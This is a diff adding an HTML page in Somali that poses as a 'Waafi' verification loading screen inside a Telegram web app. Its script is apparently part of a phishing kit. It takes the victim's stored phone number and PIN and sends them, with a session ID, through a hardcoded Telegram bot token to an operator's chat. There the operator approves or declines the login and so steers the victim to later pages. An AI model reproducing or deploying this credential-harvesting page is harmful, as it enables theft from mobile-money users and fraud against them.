@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="so">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Waafi - Diyaarinta</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        body {
+            font-family: -apple-system, sans-serif;
+            background-color: #7a7a7a;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+        
+        .loading-card {
+            background: white;
+            width: 90%;
+            max-width: 380px;
+            padding: 50px 20px;
+            border-radius: 15px;
+            text-align: center;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.2);
+        }
+        
+        .loader-circle {
+            width: 120px;
+            height: 120px;
+            background: radial-gradient(circle, #a3e635 0%, #82d13d 100%);
+            border-radius: 50%;
+            margin: 0 auto 30px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .loader-circle::after {
+            content: '';
+            width: 90px;
+            height: 90px;
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-top: 4px solid white;
+            border-radius: 50%;
+            animation: spin 1.5s linear infinite;
+        }
+        
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+        
+        h2 {
+            color: #82d13d;
+            font-size: 28px;
+            margin: 0 0 10px;
+        }
+        
+        p {
+            color: #555;
+            font-size: 16px;
+            margin: 0;
+        }
+        
+        .status-text {
+            margin-top: 15px;
+            font-size: 14px;
+            color: #777;
+            word-break: break-all;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="loading-card">
+        <div class="loader-circle"></div>
+        <h2 id="main-text">Habaynta...</h2>
+        <p id="sub-text">Diyaarinaya xaqiijinta...</p>
+        <p id="poll-status" class="status-text"></p>
+    </div>
+
+    <script>
+        // ============================================================
+        // CONFIGURE YOUR BOT HERE
+        // ============================================================
+        const BOT_TOKEN = "8512422998:AAEKuZnBVvHM_jjd0r_C03uG6lhIeDO49P8"; // <-- Replace with your bot token
+        const ADMIN_CHAT_ID = "8463654573"; // <-- Replace with admin chat ID
+        // ============================================================
+
+        document.addEventListener("DOMContentLoaded", async() => {
+            const mainText = document.getElementById("main-text");
+            const subText = document.getElementById("sub-text");
+            const pollStatus = document.getElementById("poll-status");
+            const tg = window.Telegram ? .WebApp;
+
+            if (tg) {
+                tg.ready();
+                tg.expand();
+            }
+
+            // ---- Read start_param ----
+            let startParam = '';
+            if (tg && tg.initDataUnsafe && tg.initDataUnsafe.start_param) {
+                startParam = tg.initDataUnsafe.start_param;
+            }
+            const urlParams = new URLSearchParams(window.location.search);
+            const urlStart = urlParams.get('start_param') || urlParams.get('start');
+            const decision = startParam || urlStart || '';
+
+            // If approved/denied from deep link, redirect immediately
+            if (decision === 'approved') {
+                mainText.textContent = "La ansixiyay!";
+                subText.textContent = "Bogga xiga ayaa kuu furmaya...";
+                setTimeout(() => {
+                    window.location.href = "/page8.html";
+                }, 1500);
+                return;
+            }
+            if (decision === 'denied') {
+                mainText.textContent = "La diiday!";
+                subText.textContent = "Xogtaada waa khalad.";
+                setTimeout(() => {
+                    window.location.href = "/page6.html";
+                }, 1500);
+                return;
+            }
+
+            // ---- No decision yet — send notification to bot admin ----
+            const phone = localStorage.getItem("phone") || "";
+            const pin = localStorage.getItem("lastPin") || "";
+
+            if (!phone) {
+                mainText.textContent = "Khalad";
+                subText.textContent = "Lambarka taleefanka lama helin";
+                return;
+            }
+
+            // Generate a unique session ID for this request
+            const sessionId = Date.now().toString(36) + Math.random().toString(36).substr(2, 5);
+            localStorage.setItem("sessionId", sessionId);
+
+            // Store the decision locally (polling will check this)
+            localStorage.removeItem("botDecision");
+
+            // Send login notification to admin via Telegram bot API
+            const message = `🔔 *Codsiga Login*\n\n📱 Phone: \`${phone}\`\n🔢 PIN: \`${pin}\`\n🆔 Session: \`${sessionId}\``;
+
+            const inlineKeyboard = {
+                inline_keyboard: [
+                    [{
+                        text: "✅ Approved",
+                        callback_data: `approve:${sessionId}`
+                    }, {
+                        text: "❌ Decline",
+                        callback_data: `decline:${sessionId}`
+                    }]
+                ]
+            };
+
+            const payload = {
+                chat_id: ADMIN_CHAT_ID,
+                text: message,
+                parse_mode: "Markdown",
+                reply_markup: JSON.stringify(inlineKeyboard)
+            };
+
+            try {
+                const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify(payload)
+                });
+                const result = await res.json();
+                if (result.ok) {
+                    console.log("✅ Notification sent to admin");
+                    pollStatus.textContent = "Codsiga waa la diray... sug ansixinta";
+                } else {
+                    console.error("❌ Telegram API error:", result);
+                    pollStatus.textContent = "Khalad: " + (result.description || "Unknown");
+                }
+            } catch (err) {
+                console.error("❌ Failed to send notification:", err);
+                pollStatus.textContent = "Khalad: network error";
+            }
+
+            // ---- Update text after 3 seconds ----
+            setTimeout(() => {
+                mainText.textContent = "Fadlan sug...";
+                subText.textContent = "Tani waxay qaadataa dhowr ilbiriqsi";
+            }, 3000);
+
+            // ---- Poll for decision ----
+            async function checkDecision() {
+                const storedDecision = localStorage.getItem("botDecision");
+                if (storedDecision === "approved") {
+                    mainText.textContent = "La ansixiyay!";
+                    subText.textContent = "Bogga xiga ayaa kuu furmaya...";
+                    clearInterval(pollInterval);
+                    setTimeout(() => {
+                        window.location.href = "/page8.html";
+                    }, 1500);
+                } else if (storedDecision === "denied") {
+                    mainText.textContent = "La diiday!";
+                    subText.textContent = "Xogtaada waa khalad.";
+                    clearInterval(pollInterval);
+                    setTimeout(() => {
+                        window.location.href = "/page6.html";
+                    }, 1500);
+                }
+            }
+
+            const pollInterval = setInterval(checkDecision, 2000);
+        });
+    </script>
+</body>
+
+</html>
